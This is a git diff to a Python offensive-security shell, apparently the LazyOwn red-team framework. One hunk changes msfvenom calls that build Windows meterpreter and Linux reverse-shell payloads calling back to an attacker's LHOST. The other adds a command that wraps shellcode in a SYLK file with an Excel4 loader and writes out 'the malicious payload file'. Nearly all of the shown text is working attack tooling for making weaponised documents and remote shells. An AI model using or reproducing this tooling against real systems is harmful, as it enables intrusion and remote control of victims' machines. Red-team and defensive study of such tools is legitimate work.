@@ -1790,7 +1790,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_warn("codificando payload shell_encoded.exe ")
             os.system(commands[choice])
             os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin')
-            os.system(f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} PrependFork=true -o rev.bin')
+            os.system(f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} PrependFork=true -o sessions/rev.bin')
             print_msg(f"Generated payload: {commands[choice]}")
             if choice == '15':
                 os.system("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
@@ -15396,6 +15396,49 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("Files hosts.txt, urls.txt, domains.txt, and targets.txt have been generated.")
         return
 
+    def do_shellcode2sylk(self, line):
+        """
+        Converts shellcode to SYLK format and saves the result to a file.
+
+        This function reads the provided shellcode, or retrieves it from a default
+        binary source if not supplied. The shellcode is then converted to SYLK 
+        format and saved in the `sessions/shellcode.sylk` file.
+
+        PoC Python code to create a SYLK file with Excel4 shellcode loader.
+
+        Author: Stan Hegt (@StanHacked)
+
+        Just a proof of concept. Needs polishing before use in actual operations.
+        Or as Adam Chester would put it: "RWX for this POC, because... yolo"
+
+        Background details: https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/
+
+        Args:
+            line (str): The input shellcode string. If empty or None, the function 
+                        attempts to load shellcode from a predefined source.
+
+        Returns:
+            None: The function writes the SYLK shellcode to a file and prints it 
+            out, but does not return any value.
+
+        Raises:
+            FileNotFoundError: If no shellcode is found when trying to load it from 
+                            the default source.
+        """
+        shellcode_file = 'sessions/shellcode.sylk'
+        if not line:
+            line = get_users_dic("bin")
+            if line == None:
+                print_error("Error: No shellcodes found! use venom to create a shellcode.bin")
+                return
+        shellcode = shellcode_to_sylk(line.strip())
+        choice = input("    [?] do you wanna see the payload ? (y/n)") or "n"
+        if choice == "y":
+            print_msg(shellcode)
+        print_msg("Crafting the malicious payload file sylk with shellcode inside.")
+        with open(shellcode_file, 'w') as targets_file:
+            targets_file.write(shellcode)
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
